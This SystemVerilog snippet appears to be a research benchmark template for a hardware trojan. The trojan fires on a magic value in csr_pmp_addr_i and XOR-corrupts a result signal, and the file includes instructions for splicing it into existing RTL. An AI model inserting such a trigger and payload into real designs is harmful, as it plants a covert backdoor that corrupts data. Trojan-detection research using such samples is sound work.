/**
 * Combinational Integrity Trojan - Code Snippet
 * 
 * Trust-Hub Category: Change Functionality ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
 * 
 * Description:
 *   Corrupts data when trigger condition met
 *   
 * Trigger: Pattern match on csr_pmp_addr_i
 * Payload: Corrupt result with XOR mask
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern
localparam logic [31:0] TRIGGER_PATTERN = 32'hBADF00D;

wire trojan_active;
assign trojan_active = (csr_pmp_addr_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD: Data Corruption
// ============================================================

// Corruption mask for XOR operation
localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Integrity Violation: Corrupt result with XOR
//
// Integration Script Must Modify:
//
// IF result is assigned:
//   Find: assign result = data_value;
//   Replace: assign result = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF result is output of always_comb:
//   Find: result = data_value;
//   Replace: result = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// Note: Adjust CORRUPTION_MASK width to match signal width if needed